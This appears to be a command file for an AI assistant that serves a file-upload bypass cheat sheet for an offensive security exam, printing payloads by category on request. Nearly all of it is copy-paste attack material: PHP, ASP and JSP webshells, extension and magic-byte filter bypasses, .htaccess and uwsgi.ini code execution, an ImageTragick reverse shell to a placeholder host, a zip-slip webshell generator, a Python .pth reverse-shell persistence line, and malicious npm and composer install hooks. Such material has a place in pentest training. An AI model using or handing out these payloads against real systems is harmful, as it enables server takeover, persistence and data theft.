# Trigger
User says `/osai-upload` followed by an optional category.

Categories: extensions, contenttype, magic, webshell, polyglot, htaccess, filename, imagetragik, ffmpeg, zipslip, depmanager

$ARGUMENTS = optional category filter. If empty, list all categories with one-line description and ask which one.

# Purpose
File upload bypass cheat sheet for OSAI exam. Every payload is copy-paste ready.

# Steps

## If no category specified, print this menu:
```
OSAI FILE UPLOAD BYPASS CHEAT SHEET
  extensions   — Executable extensions by language + bypass tricks (double, null byte, case, RTLO)
  contenttype  — Content-Type spoofing (image types, double header)
  magic        — Magic bytes for PNG/JPG/GIF to prepend to shells
  webshell     — Webshells by language (PHP, ASP, JSP) + alternative tags
  polyglot     — Polyglot files (PHP-in-JPEG, EXIF shell, ADS)
  htaccess     — .htaccess RCE + uwsgi.ini
  filename     — Filename-based injection (SQLi, XSS, LFI, cmd injection)
  imagetragik  — ImageMagick CVEs (RCE, SSRF, info disclosure)
  ffmpeg       — FFMpeg HLS file read
  zipslip      — Zip-slip path traversal + .pth persistence
  depmanager   — Dependency manager overwrite (package.json, composer.json)

Usage: /osai-upload extensions
```

---

## Category: extensions

### PHP executable extensions
`.php` `.php3` `.php4` `.php5` `.php7` `.pht` `.phps` `.phar` `.phpt` `.pgif` `.phtml` `.phtm` `.inc`

### ASP executable extensions
`.asp` `.aspx` `.config` `.cer` (IIS <= 7.5) `.asa` (IIS <= 7.5) `shell.aspx;1.jpg` (IIS < 7.0) `shell.soap`

### JSP executable extensions
`.jsp` `.jspx` `.jsw` `.jsv` `.jspf` `.wss` `.do` `.actions`

### Perl
`.pl` `.pm` `.cgi` `.lib`

### Coldfusion
`.cfm` `.cfml` `.cfc` `.dbm`

### Dangerous extensions for other vulns
- `.svg` — XXE, XSS, SSRF
- `.gif` — XSS
- `.csv` — CSV Injection
- `.xml` — XXE
- `.avi` — LFI, SSRF
- `.js` — XSS, Open Redirect
- `.zip` — RCE, DOS, LFI Gadget
- `.html` — XSS, Open Redirect

### Extension bypass tricks

**Double extensions:**
`.jpg.php` `.png.php5`

**Reverse double extension (Apache misconfig):**
`.php.jpg`

**Random case:**
`.pHp` `.pHP5` `.PhAr`

**Null byte:**
`.php%00.gif` `.php\x00.gif` `.php%00.png` `.php%00.jpg`

**Multiple dots (Windows strips trailing dots):**
`file.php......`

**Whitespace/newline:**
`file.php%20` `file.php%0d%0a.jpg` `file.php%0a`

**RTLO (Right to Left Override):**
`name.%E2%80%AEphp.jpg` — renders as `name.gpj.php`

**Slash tricks:**
`file.php/` `file.php.\` `file.j\sp` `file.j/sp`

**Multiple special chars:**
`file.jsp/././././.`

**UTF-8 filename:**
```
Content-Disposition: form-data; name="anyBodyParam"; filename*=UTF8''myfile%0a.txt
```

### Windows-specific file tricks
- `include`/`require` strip trailing space, `"`, `.`, `<`, `>` from filenames
- `fopen` strips trailing `.`, `/`, `\`
- `move_uploaded_file` strips trailing `.`, `/`, `\`
- PHP on IIS: `>` becomes `?`, `<` becomes `*`, `"` becomes `.`
  - Use single quotes: `filename='web"config'` to overwrite `web.config`

---

## Category: contenttype

### Legitimate image types to spoof
```
Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg
```

### PHP content-types (to recognize when blocked)
```
text/php
text/x-php
application/php
application/x-php
application/x-httpd-php
application/x-httpd-php-source
```

### Double Content-Type
Set Content-Type twice in the request — once for the disallowed type, once for the allowed type. Some parsers take the last one.

---

## Category: magic

### Magic bytes to prepend

**GIF:**
```
GIF87a
GIF8;
```
Example: `GIF8;<?php system($_GET['cmd']); ?>`

**PNG:**
`\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`

**JPG:**
`\xff\xd8\xff`

### Usage
Prepend magic bytes to shell file to pass magic-byte validation:
```bash
echo -n -e '\xff\xd8\xff' > shell.php.jpg
cat payload.php >> shell.php.jpg
```

---

## Category: webshell

### PHP one-liners
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php if($_POST){system($_POST['cmd']);} ?>
```

### PHP backtick (shortest)
```php
<?=`$_GET[0]`?>
```

### Alternative PHP tags (no <?php needed)
```html
<script language="php">system("id");</script>
```

### ASP webshell
```asp
<% eval request("cmd") %>
```

### ASPX webshell
```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c " + Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>
```

### JSP webshell
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## Category: polyglot

### PHP shell in JPEG EXIF
```bash
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```
Call: `curl 'http://target/test.php?0=system' --data "1='ls'"`

### NTFS Alternate Data Stream (ADS)
```
file.asax:.jpg        # creates empty file with forbidden extension
file.asp::$data.      # creates non-empty file using ADS
```

### GIF header + PHP
```
GIF8;<?php system($_GET['cmd']); ?>
```
Save as `shell.gif` or `shell.php.gif`

---

## Category: htaccess

### .htaccess RCE (Apache)
Upload `.htaccess` with:
```
AddType application/x-httpd-php .rce
```
Then upload any file with `.rce` extension — it executes as PHP.

### uwsgi.ini RCE
```ini
[uwsgi]
foo = @(exec://whoami)
bar = @(http://ATTACKER/)
test = @(data://ATTACKER/)
```

---

## Category: filename

### Filename-based injection payloads

**SQLi:**
```
poc.js'(select*from(select(sleep(20)))a)+'.extension
```

**LFI/Path traversal:**
```
image.png../../../../../../../etc/passwd
../../../tmp/lol.png
```

**XSS:**
```
'"><img src=x onerror=alert(document.domain)>.extension
```

**Command injection:**
```
; sleep 10;
```

---

## Category: imagetragik

### ImageTragick (CVE-2016-3714, ImageMagick < 7.0.1-1)

**Reverse shell payload (save with image extension):**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/KALI/PORT 0>&1|touch "hello)'
pop graphic-context
```

**Ghostscript RCE payload:**
```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```
Trigger: `convert shellexec.jpeg whatever.gif`

### CVE-2022-44268 (ImageMagick info disclosure)
```bash
apt-get install pngcrush imagemagick exiftool exiv2 -y
pngcrush -text a "profile" "/etc/passwd" exploit.png
# Upload exploit.png, download converted image, then:
identify -verbose pngconverted.png
python3 -c 'print(bytes.fromhex("HEX_FROM_OUTPUT").decode("utf-8"))'
```

---

## Category: ffmpeg

### FFMpeg HLS file read
```
./gen_xbin_avi.py file://<filename> file_read.avi
```

### HLS playlist inside AVI
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```

---

## Category: zipslip

### Zip-slip path traversal
Create ZIP with path-traversal filenames:
```bash
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.writestr('../../../tmp/evil.php','<?php system(\$_GET[\"cmd\"]); ?>')
"
```

### Python .pth persistence
Drop into site-packages (find with `python3 -m site`):
```bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > /usr/local/lib/python3.6/site-packages/persistence.pth
```

Default locations:
```
/usr/lib/pythonX.Y/site-packages/
/usr/local/lib/pythonX.Y/dist-packages/
```

---

## Category: depmanager

### package.json (npm)
```json
{
  "scripts": {
    "prepare": "/bin/touch /tmp/pwned.txt"
  }
}
```

### composer.json (PHP)
```json
{
  "scripts": {
    "pre-command-run": [
      "/bin/touch /tmp/pwned.txt"
    ]
  }
}
```

Upload these to overwrite existing dependency manager configs — commands execute on `npm install` or `composer install`.

# Token discipline
Print ONLY the requested category. Never dump the entire cheat sheet unless user asks for all.
